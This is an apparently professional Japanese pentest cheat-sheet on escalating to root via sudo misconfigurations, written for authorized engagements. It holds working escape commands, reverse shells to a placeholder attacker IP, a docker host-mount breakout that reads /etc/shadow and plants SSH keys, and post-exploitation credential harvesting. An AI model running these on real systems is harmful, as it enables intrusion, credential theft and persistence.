# sudo 設定不備による権限昇格

## 概要

`/etc/sudoers` の設定ミスにより、特定のコマンドをパスワードなしで root として実行できる場合がある。

---

## 着火条件

```bash
sudo -l
```

出力に `NOPASSWD` または特定コマンドへの許可が含まれている場合。

---

## 観点・着眼点（パターン全体）

**`sudo -l` の出力で何に気付くか：**

| `sudo -l` に見える要素 | 示唆 | 次のアクション |
|--------------------|-----|------------|
| `NOPASSWD:` | パスワード不要で sudo 実行可能 | 該当コマンドを GTFOBins で検索 |
| `(ALL : ALL)` / `(ALL)` | 任意ユーザーとして実行可 | そのまま `sudo -u root [CMD]` |
| `(root)` が明示 | root 権限で実行できる | 昇格経路として最優先 |
| コマンドの末尾が `*`（ワイルドカード） | 引数を自由に指定可能 | サブコマンドや `--config` などから escape を狙う |
| スクリプトパスが `/opt/` / `/home/` / `/usr/bin/` 配下のシェルスクリプト | 自作スクリプトの可能性 | スクリプトを `cat` して内部呼び出しの形式（フルパス vs 相対パス）を確認 → パターン3 / パターン6 |
| `env_keep+=LD_PRELOAD` | 環境変数を引き継ぐ | 共有ライブラリ注入（LD_PRELOAD 攻撃） |
| `sudo` のバージョンが 1.8.28 未満 | CVE-2019-14287（`!root` バイパス）候補 | `sudo -u#-1 [CMD]` を試す |
| `docker` / `docker exec` への許可 | コンテナブレイクアウト候補 | パターン4へ |
| **`Defaults secure_path=...` が見えていて、許可スクリプトが内部で `./xxx` を呼ぶ** | **PATH ハイジャックは secure_path に阻まれるが、CWD（カレントディレクトリ）からの相対呼び出しは secure_path で守られない** | **パターン6（CWD ハイジャック）へ** |

---

## 典型的な出力パターンと対応

### パターン1: 特定コマンドに NOPASSWD

```
(ALL) NOPASSWD: /usr/bin/vim
(ALL) NOPASSWD: /usr/bin/python3
(ALL) NOPASSWD: /usr/bin/find
```

→ GTFOBins で対象コマンドの「Sudo」セクションを確認

**悪用手順：**
```bash
# vim / nano / less
sudo vim -c ':!/bin/bash'

# python / python3
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'

# find
sudo find . -exec /bin/bash \; -quit

# awk
sudo awk 'BEGIN {system("/bin/bash")}'
```

**注意点・落とし穴：**

- 絶対パスが指定されている（`/usr/bin/vim`）場合、シンボリックリンクや PATH 経由での呼び出しは通らない。そのパスで呼ぶ
- バイナリが別の場所にも存在し、片方だけ許可されている場合がある。`which vim` で確認
- GTFOBins にない独自コマンドでも、内部で外部コマンドを呼んでいれば PATH ハイジャックで悪用できることがある
- エディタ系（`vim`, `nano`, `less`, `more`, `man`）は「編集機能から外部コマンド実行」が共通パターン

### パターン2: ALL コマンドを許可

```
(ALL) NOPASSWD: ALL
```

→ `sudo /bin/bash` で即座に root

**注意点・落とし穴：**

- これが見えた時点で即 root。他の探索に時間を使わない
- ただし `sudo -l` 実行自体にパスワードが必要なケースがある（`Defaults rootpw` 設定等）。現ユーザーのパスワードを取得してから再実行

### パターン3: 特定スクリプトの実行を許可

```
(ALL) NOPASSWD: /opt/scripts/backup.sh
```

**悪用手順：**
```bash
# スクリプトが書き込み可能な場合 → 直接書き換え
echo 'bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1' >> /opt/scripts/backup.sh
sudo /opt/scripts/backup.sh

# スクリプトが書き込み不可 → スクリプト内から呼ばれる外部コマンドの PATH ハイジャック
# 1. スクリプトを cat で読む
cat /opt/scripts/backup.sh
# 2. フルパスなしで呼ばれているコマンド（例: tar, cp）を確認
# 3. /tmp/tar に偽バイナリを置いて PATH を先頭に注入
echo -e '#!/bin/bash\n/bin/bash' > /tmp/tar && chmod +x /tmp/tar
PATH=/tmp:$PATH sudo /opt/scripts/backup.sh
```

**注意点・落とし穴：**

- スクリプトが書き込み可能か確認: `ls -la /opt/scripts/backup.sh`
- 書き込み不可でも「親ディレクトリが書き込み可能」なら元ファイルを消して同名で作り直せる
- スクリプト内のフルパスなしコマンド（`tar`, `cp`, `date` 等）は PATH ハイジャック対象
- `sudo` は既定で `secure_path` を強制するため単純な PATH 汚染は効かないことが多い。`sudoers` に `env_reset` が無い / `secure_path` が定義されていない時のみ有効

---

## 悪用手順（共通テクニック）

### vim / nano / less

```bash
sudo vim -c ':!/bin/bash'
sudo vim -c ':py3 import os; os.execl("/bin/bash", "bash", "-c", "reset; exec bash")'
```

### python / python3

```bash
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
sudo python3 -c 'import os; os.system("/bin/bash")'
```

### find

```bash
sudo find . -exec /bin/bash \; -quit
```

### awk

```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```

### 任意スクリプトが書き込み可能な場合

```bash
# スクリプトにリバースシェルを追記
echo 'bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1' >> /opt/scripts/backup.sh

# sudo で実行
sudo /opt/scripts/backup.sh
```

---

## 全パターン共通の注意点・落とし穴

- `sudo -l` でパスワードを求められる場合でも、現在のユーザーのパスワードが判明していれば入力できる
- `env_keep` の設定次第では環境変数（`LD_PRELOAD` 等）を引き継いで悪用できる
- sudoers の `!root` 指定（特定ユーザー以外として実行）は古い sudo でバイパスできる場合がある（CVE-2019-14287 → `sudo -u#-1 [CMD]`）
- `sudo -l` は「現在のセッション・ユーザー」に対してしか表示されない。su / ssh で別ユーザーになったら再実行する
- `tty_tickets` が有効だと tty ごとにパスワードキャッシュが分かれる。別シェルで通っても別 tty では通らない

---

## パターン4: docker exec へのワイルドカード NOPASSWD

### 着火条件
`sudo -l` の出力に以下のようなエントリがある場合：

```
(root) NOPASSWD: /snap/bin/docker exec *
(root) NOPASSWD: /usr/bin/docker exec *
```

ワイルドカード `*` により、`docker exec` のオプションを自由に指定できる。

### 観点・着眼点
`docker exec` は実行中コンテナにプロセスを起動する。`--user root` フラグを付けることで、コンテナ内で root として実行できる。さらに、コンテナがホストのブロックデバイス（`/dev/sda1` 等）にアクセスできる場合はホストのファイルシステム全体をマウントして読み書きが可能。

**コンテナIDを特定する方法：**

- `cat /etc/hosts`（コンテナ内からアクセスできている場合）→ ホスト名が16進文字列
- パストラバーサル等で `/etc/hosts` を読み取った場合も同様

### 手順

**ステップ1: コンテナIDの特定**
```bash
# /etc/hosts の確認（コンテナ内でのホスト名 = コンテナID）
# パストラバーサルで読み取った場合も同様
# 出力例: 172.17.0.2   [CONTAINER_ID]
```

**ステップ2: コンテナ内で root として実行できるか確認**
```bash
sudo /snap/bin/docker exec --user root [CONTAINER_ID] id
# uid=0(root) gid=0(root) groups=0(root),...
```

**ステップ3a: コンテナ内でシェルを取得**
```bash
sudo /snap/bin/docker exec --user root [CONTAINER_ID] /bin/sh
# または
sudo /snap/bin/docker exec -it --user root [CONTAINER_ID] /bin/bash
```

**ステップ3b: `--privileged` フラグ付きでコンテナ内に root インタラクティブシェルを取得**

`docker exec` に `--privileged` フラグを付けることで、**コンテナの起動設定に関係なく**、exec されたプロセスに特権 capabilities が付与される。これにより、コンテナ内から `/dev/sda*` 等のホストのブロックデバイスが見えるようになりマウントが可能になる。

```bash
# [Attacker] --privileged + インタラクティブシェルでコンテナ内に入る
sudo /snap/bin/docker exec -u root --privileged -it [CONTAINER_ID] bash
# bash が使えない場合
sudo /snap/bin/docker exec -u root --privileged -it [CONTAINER_ID] /bin/sh
```

**ステップ3c: コンテナ内でホストデバイスを特定してマウント**

```bash
# [Target: コンテナ内] mount コマンドでマウント状況を確認する
# /etc/hostname や /etc/hosts が /dev/sda* 系のデバイスからマウントされていれば
# そのデバイスがホストのルートパーティション
mount
# 出力例（ホストの設定ファイルがコンテナにバインドマウントされている場合）:
# /dev/sda1 on /etc/resolv.conf type ext4 (rw,relatime)
# /dev/sda1 on /etc/hostname type ext4 (rw,relatime)  ← ホストのデバイス名が判明
# /dev/sda1 on /etc/hosts type ext4 (rw,relatime)

# mount 出力から特定したデバイスをマウントする
# （環境によって vda1 / nvme0n1p1 等デバイス名が異なる。lsblk でも確認可能）
mount /dev/sda1 /mnt

# マウント成功確認
ls /mnt
# bin  boot  etc  home  root  ...  ← ホストのファイルシステムが見える

# ホストの shadow を取得（横展開観点）
cat /mnt/etc/shadow | head -3

# ホストの root に SSH 公開鍵を書き込む（root シェル取得）
echo '[SSH_PUBKEY]' >> /mnt/root/.ssh/authorized_keys
```

コンテナを抜けてホストに SSH 接続する：
```bash
# [Attacker] ホスト側に直接 SSH（公開鍵認証）
ssh -i [PRIVATE_KEY_PATH] root@[TARGET_IP]
```

### 注意点・落とし穴
- **`--privileged` フラグは `docker exec` のオプションとして使う。** コンテナ自体を再起動する必要はない。`docker exec --privileged` は exec されたプロセス（bash 等）にだけ特権を付与する
- コンテナが通常モード（non-privileged）で起動していても `--privileged` を `docker exec` に付ければブロックデバイスが見える
- `-it` フラグ（インタラクティブ + TTY）は TTY を確保するが、環境によっては動作しない。その場合は `-i` のみ、または `sh -c '[COMMAND]'` を使う
- マウント後のパスはコンテナ内のパス。ホストの `/etc/shadow` は `/mnt/host/etc/shadow` でアクセス
- ホストのファイルシステムへの書き込みも可能なため、SSH 鍵の埋め込みや `/etc/passwd` の書き換えも実施できる
- `/dev/sda1` が見つからない場合は `lsblk` で確認。`vda1`・`nvme0n1p1` 等、環境によってデバイス名が異なる

> **なぜコンテナ内からホストのブロックデバイスが見えるのか** — Docker の namespace 分離の仕組み・`/dev/sda1` の命名規則・capability との関係を理解したい場合は `../06_Concepts/Docker_Isolation.md` を参照。

---

---

## パターン5: スクリプトが YAML.load / pickle.load 等でユーザー書き込み可能なファイルを読み込む場合

### 着火条件

`sudo -l` の出力に以下のようなエントリがある場合：

```
(root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
(root) NOPASSWD: /usr/bin/python3 /opt/restore.py
```

スクリプトを `cat` で確認した際に以下のいずれかが見つかる場合：
- `YAML.load(File.read(...))` — Ruby の安全でない YAML 読み込み
- `pickle.load(open(...))` — Python のオブジェクトデシリアライゼーション
- 読み込み先ファイルが**現ユーザーが書き込めるパスにある**（例: カレントディレクトリ、`/home/[USER]/`）

### 観点・着眼点

**「何が出たら次に何をするか」：**

| スクリプトの中身 | 意味 | 次のアクション |
|----------------|------|-------------|
| `YAML.load(File.read("dependencies.yml"))` （相対パス） | カレントディレクトリのファイルを読む。書き込み可能ディレクトリで sudo を実行すれば任意YAMLを読ませられる | 自分が書けるディレクトリに移動 → 悪意ある `dependencies.yml` を作成 → sudo 実行 |
| `YAML.load(File.read("/home/[USER]/deps.yml"))` （絶対パス かつ 自分のホームディレクトリ） | ホームディレクトリは通常書き込み可能 | 同上 |
| `YAML.safe_load(...)` | 安全なロード。任意オブジェクトのデシリアライズは不可 | このパターンは使えない。スクリプトの他の箇所を確認 |
| `pickle.load(open("backup.pkl", "rb"))` | Python の pickle デシリアライゼーション。任意コード実行可能 | pickle ファイルを偽装して配置 |

**YAML.load の危険性：** Ruby の `YAML.load` (Psych ライブラリ) は `!ruby/object:ClassName` タグを使うことで**任意の Ruby オブジェクトをインスタンス化**できる。これを連鎖させる（Gadget Chain）ことで、最終的に `Kernel#system` を呼ばせられる。

> 原理（なぜ YAML.load でコードが実行されるか・Gadget Chain の動作ステップ） → `../06_Concepts/YAML_Deserialization.md`

### 手順

#### Step 1: スクリプトの内容と読み込みパスを確認

```bash
# [Target] sudo で実行されるスクリプトを確認
cat [スクリプトパス]
```

確認ポイント：
- `YAML.load` と `YAML.safe_load` のどちらを使っているか
- 読み込むファイルのパスが相対パス（`"dependencies.yml"` 等）か絶対パスか
- 絶対パスの場合、そのファイルが書き込み可能な場所（自分のホームディレクトリ等）にあるか

#### Step 2: 悪意ある YAML ファイルを書き込み可能なディレクトリに作成

**事前準備（必須）：**

- ファイル名はスクリプト内の `YAML.load(File.read(...))` の引数で確認する
- 相対パスの場合は **sudo を実行するカレントディレクトリ** にファイルを置く
- `cat << 'EOF' >` でファイルを作成する（`'EOF'` をシングルクォートで囲むことで `!` 等がシェルに解釈されない）

```bash
# [Target] ファイルを書き込み可能なディレクトリに移動
cd [ファイルを置くディレクトリ]

# YAML ペイロードを作成して配置
cat << 'EOF' > [スクリプトが読み込むファイル名]
[ペイロード内容は CVE_Notes.md を参照]
EOF
```

> YAML ペイロードの全文（Psych Gadget Chain）と `git_set:` のコマンド変種 → `../05_Tools_Reference/CVE_Notes.md`（Ruby YAML.load Psych Gadget Chain セクション）

#### Step 3: sudo でスクリプトを実行

```bash
# [Target] sudo 実行（エラーが出ても途中でコマンドが走ることがある）
sudo /usr/bin/ruby [スクリプトパス]
# エラー例: undefined method `map' for nil:NilClass (NoMethodError)
# → エラーが出てもコマンドが実行済みの場合がある。次の Step で必ず確認する
```

#### Step 4: SUID が設定されたことを確認してシェルを取得

```bash
# [Target] SUID が設定されているか確認
ls -la /bin/bash
# -rwsr-sr-x 1 root root ... /bin/bash  ← s が付いていれば成功

# bash -p で EUID=root として実行（-p は実効 UID を落とさずに起動するオプション）
/bin/bash -p

# 確認
id
# uid=1000([USER]) gid=1000([USER]) euid=0(root) egid=0(root)
```

#### Step 5（原状回復・必須）

```bash
# [Target] SUID を元に戻す
chmod -s /bin/bash

# 作成した YAML ファイルを削除
rm [作成したファイル名]
```

### 刺さらなかったとき

- `YAML.safe_load` が使われている → このガジェットチェーンは使えない。スクリプトの他の脆弱性（外部コマンドの PATH ハイジャック等）を探す
- エラーなしで正常終了するが SUID が設定されない → YAML の構造が崩れている。インデントが 2 スペース単位であることを確認する（YAML はインデント厳格）
- `ruby 3.1` 以降 → Psych 4.0 に更新されデフォルトで `safe_load` 相当になっているため、このガジェットチェーンは動作しない（`YAML.unsafe_load` に明示変更しない限り）
- `cat << 'EOF' >` でファイルを作ってもインデントが崩れる → `printf` / `python3 -c "print(...)"` / `vi` 等で直接作成する

### 注意点・落とし穴

- **YAML のインデントは 2 スペース厳守。** タブ文字が混入するとパース失敗。`cat -A dependencies.yml` で `^I`（タブ）がないことを確認する
- `cat << 'EOF' >` はシングルクォート付き `'EOF'` であることが重要。ダブルクォート `"EOF"` や引用符なし `EOF` だとヒアドキュメント内の `!` や `$` がシェルに解釈される
- `chmod +s /bin/bash` 後に bash を通常実行（`/bin/bash`）すると SUID が落とされる。必ず `-p` オプションを付ける
- sudo 実行後にエラーが出ても、YAML の途中まで処理されてコマンドが走っていることがある。エラーを見て諦めず `ls -la /bin/bash` で確認する
- **原状回復必須：** `chmod -s /bin/bash` で SUID を必ず元に戻す。実環境で SUID を残したままにすると、後からシステムを監視しているツールに検知される

### 関連技術
- 前：sudo -l でスクリプトパスを発見 → このファイルの観点・着眼点（パターン全体）
- 後：bash -p での root シェル取得 → `./Enumeration_Checklist.md`（侵入後列挙）
- YAML.load が任意コード実行できる原理 → `../06_Concepts/YAML_Deserialization.md`
- `.bundle/config` 等からの認証情報取得（横移動に必要） → `../02_Initial_Access/Credential_Discovery.md`

---


## パターン6: sudo スクリプトが内部で別スクリプトを「相対パス」で呼ぶ場合（CWD ハイジャック）

### 着火条件

`sudo -l` の出力に以下のようなエントリがある（パターン3 と同様）：

```
(ALL) NOPASSWD: /usr/bin/[SCRIPT_NAME]
(root) NOPASSWD: /opt/scripts/[SCRIPT_NAME]
```

スクリプトを `cat` して内容を確認した際に、以下のいずれかが見つかる場合：

- 内部で別スクリプト・実行ファイルを **絶対パスではなく相対パス**（`./xxx.sh`、`xxx.sh`）で呼んでいる
- スクリプトファイル本体は **書き込み不可**（パターン3 の方法は使えない）
- `Defaults secure_path=...` が `sudoers` で設定されており、PATH ハイジャックは効かない

```bash
# [Target] スクリプトの中身を確認
cat /usr/bin/[SCRIPT_NAME]
# 内部に以下のような相対呼び出しがある
#   ./initdb.sh 2>/dev/null
#   ./helper
#   sh ./run-checks.sh
```

### 観点・着眼点

**なぜ「相対パス呼び出し」が CWD ハイジャックになるのか：**

スクリプトが `./xxx.sh` という形で別ファイルを呼ぶと、それは **「現在の作業ディレクトリ（CWD）にある xxx.sh」** を指す。`secure_path` は `PATH` 環境変数を上書きする保護だが、`./` 始まりの相対パスは PATH 探索を経由しない（カレントディレクトリ直接参照）ため **secure_path で守られない**。

`sudo` を実行する際、攻撃者は自由に CWD を変えられる：

```bash
# [Target] 書き込み可能なディレクトリへ移動してから sudo
cd /tmp
sudo /usr/bin/[SCRIPT_NAME]
# → スクリプト内の ./xxx.sh は /tmp/xxx.sh を指す
```

つまり **「自分が書けるディレクトリに偽の `xxx.sh` を置いてから sudo する」** だけで、root 権限でその偽スクリプトが実行される。

**「何が出たら次に何をするか」：**

| スクリプトの中身に出てくる呼び出し形式 | 意味 | 次のアクション |
|---------------------------------|------|-------------|
| `./xxx.sh`（先頭に `./`） | CWD 直下の xxx.sh を実行 | 書き込み可能 dir に偽 xxx.sh を配置 → そこで sudo 実行 |
| `xxx`（パスなし、組み込みコマンドでもない） | PATH 探索 → secure_path に阻まれる | secure_path を確認。空 or `:.` を含むなら PATH ハイジャックも有効 |
| `sh xxx.sh` / `bash xxx.sh`（先頭 `./` なし） | sh / bash がカレントから探す動作になることがある | CWD ハイジャックが刺さる可能性。同じ手順で試す |
| `/absolute/path/xxx.sh` | フルパス | この攻撃面ではない。スクリプト自体の書き込み権限・引数注入に切り替え |
| `pgrep -x "xxx.sh"` で「動いていなければ起動」のロジック直後 | 通常時は xxx.sh が動いていない → CWD ハイジャックの発火条件が常に成立する | 即試す |

**スクリプトの典型構造（高確率で刺さるパターン）：**

```bash
#!/bin/bash
# 権限チェック
if [ "$EUID" -ne 0 ]; then
  exit 1
fi

# 各種チェック処理（フルパスで安全）
/usr/bin/find ...
/usr/bin/df ...

# ここが脆弱：相対パス呼び出し
if ! /usr/bin/pgrep -x "[SERVICE_NAME]" &>/dev/null; then
  ./[SERVICE_NAME] 2>/dev/null    # ← CWD から実行される
fi
```

### 環境前提

- 実行環境: ターゲット（侵入後シェル取得済み）
- 必要なツール: 標準 shell のみ（`bash`, `chmod`, `cd`）
- 攻撃者側に書き込み権限があるディレクトリが必要（`/tmp` がほぼ常に使える）

### 手順

#### Step 1: スクリプトの内容を確認して相対呼び出しを特定

```bash
# [Target] sudo で実行できるスクリプトを cat
cat /usr/bin/[SCRIPT_NAME]
```

確認ポイント：
- `./xxx` で呼ばれているコマンド名を控える（このファイル名で偽物を作る）
- そのスクリプトが「常時動いていない」ことが条件（`pgrep -x` で存在チェックしている場合は OK）

#### Step 2: 書き込み可能なディレクトリで偽スクリプトを作成

**事前準備（必須）：** ファイル名はスクリプト内の相対呼び出しと **完全一致** させる。

```bash
# [Target] 書き込み可能ディレクトリに移動
cd /tmp

# 偽スクリプトを作成（root 権限で bash を起動するペイロード）
echo -e '#!/bin/bash\n/bin/bash' > /tmp/[SCRIPT_NAME]

# 実行権限を付与（必須）
chmod +x /tmp/[SCRIPT_NAME]
```

#### Step 3: 同じディレクトリから sudo 実行

```bash
# [Target] CWD が /tmp の状態で sudo
sudo /usr/bin/[SCRIPT_NAME]
# → スクリプト内の ./[SCRIPT_NAME] が /tmp/[SCRIPT_NAME] を実行 → root 権限で /bin/bash 起動
```

#### Step 4: root シェル取得を確認

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

### 刺さらなかったとき

| 観測される症状 | 推定原因 | 次のアクション |
|--------------|---------|-------------|
| sudo 実行してもスクリプトが偽物を呼ばない | 該当処理が条件分岐で skip されている（`pgrep` で本物が見つかっている等） | 本物のプロセスを止めるか、別の相対呼び出し箇所を探す |
| `Permission denied` | 偽スクリプトに実行権限がない | `chmod +x` を再実行 |
| `command not found` | スクリプトが `bash xxx.sh` のように呼んでいるのに `xxx` で作った | 呼び出し形式と完全一致するファイル名で作り直す |
| sudo は通るが root シェルが立たない | スクリプトがエラーで途中終了 / `2>/dev/null` で出力が消えている | 偽スクリプトの中身を `bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1` 形式のリバースシェルに変える |
| `Defaults env_reset` で `PWD` がリセットされる挙動を疑う | 環境変数 reset でも CWD（プロセスの作業ディレクトリ）はリセットされない | 通常 CWD ハイジャックは成立する。別の原因を探す |

### 注意点・落とし穴

- **`secure_path` は CWD 経由の相対呼び出しを止めない。** PATH ハイジャックと混同しない。secure_path が見えていても CWD ハイジャックは別経路で成立する
- **ファイル名は完全一致が必須。** スクリプト内が `./initdb.sh` なら `/tmp/initdb.sh`。大文字小文字も含めて一致させる
- **`pgrep -x` で存在チェックされている場合、本物のプロセスが動いている間は偽物が呼ばれない。** タイミング依存だが、通常 service が止まっている隙が長く続くケースが多い
- **CWD は `cd` で自由に変えられる。** sudo 実行時のカレントディレクトリは呼び出し元プロセスから引き継がれる
- **偽スクリプトは原状回復対象。** root 取得後に `rm /tmp/[SCRIPT_NAME]` で削除する
- **本パターンは secure_path が設定された環境で特に有効。** 「PATH ハイジャックが効かない」と諦める前に内部呼び出しの相対パス有無を必ず確認する

### 本番での前提

- **事前合意の要否**: ★★（口頭確認可）— 既存スクリプトの挙動を観察するのみ。原状回復が容易なら追加合意なしで実施可能
- **想定される SIEM/EDR 検知**: `sudo` ログに `/usr/bin/[SCRIPT_NAME]` の実行が残る（auditd / sudoers のログ設定による）。`/tmp/[SCRIPT_NAME]` の作成も `auditctl -w` 監視範囲なら検知される
- **業務影響リスク**: 偽スクリプトが `/bin/bash` 起動だけなら影響なし。本物の service が止まっている間に呼ばれるのみ
- **原状回復必須項目**: ✅ `/tmp/[SCRIPT_NAME]` 削除 / ✅ 取得した root シェルを exit / ✅ 偽スクリプトにテスト識別子コメント `# kedalab-[CASE_ID]` を入れておくと grep で識別しやすい
- **取得情報の取扱**: 暗号化保管 / テスト完了時破棄
- **演習環境での扱い**: 制約なし

### 関連技術

- 前：`sudo -l` でスクリプトパスを発見・スクリプト本体は書き込み不可 → このファイルの観点・着眼点（パターン全体）
- 前：システムメールに「新しいシステムチェックスクリプトが導入された」等の言及 → `./Enumeration_Checklist.md`（システムメールの確認）
- 後：root シェル取得後の確認事項 → このファイル末尾「昇格成功後に確認すること（横展開観点）」
- 関連：パターン3（スクリプト本体が書き込み可能 / PATH ハイジャック）との比較 → 上のパターン3
- 関連：sudo の `secure_path` の動作原理 → `sudoers(5)` man page

---

---

## 昇格成功後に確認すること（横展開観点）

**「sudo で root になれた = ゴール」ではない。** root 権限を得た時点で以下を確認し、横展開・証跡収集を行う。

- `/root/.ssh/` 配下の秘密鍵 → 他ホストへの SSH 接続性の確認
- `/etc/shadow` 全エントリのハッシュ → 他システムでのパスワード使い回し検証（`hashcat` で一括クラック）
- `/root/.bash_history` → 直近の接続先・コマンド履歴（他ホスト・サービスへの接続情報が残っている場合がある）
- root cron / systemd サービスへの認証情報の埋め込み（設定ファイル・スクリプト）
- **Docker ブレイクアウト成功時**：ホスト FS マウント後に `/mnt/root/.ssh/` / `/mnt/etc/shadow` / `/mnt/root/.bash_history` を確認する
- 内部サービス（DB・管理画面・API）の設定ファイル・環境変数 → 接続情報・シークレット
- AD 連携設定（`/etc/sssd/sssd.conf` / `/etc/krb5.conf`）→ ドメイン側資格情報の可能性

---

## 関連技術
- 前：侵入後の列挙チェックリスト → `./Enumeration_Checklist.md`
- 後：その他の昇格手法 → `./Capabilities.md`, `./SUID_SGID.md`
- 関連：パストラバーサルでコンテナIDを特定 → `../02_Initial_Access/Web_Vulnerabilities/Path_Traversal.md`
- 関連：Docker 分離の原理（なぜ効くか） → `../06_Concepts/Docker_Isolation.md`
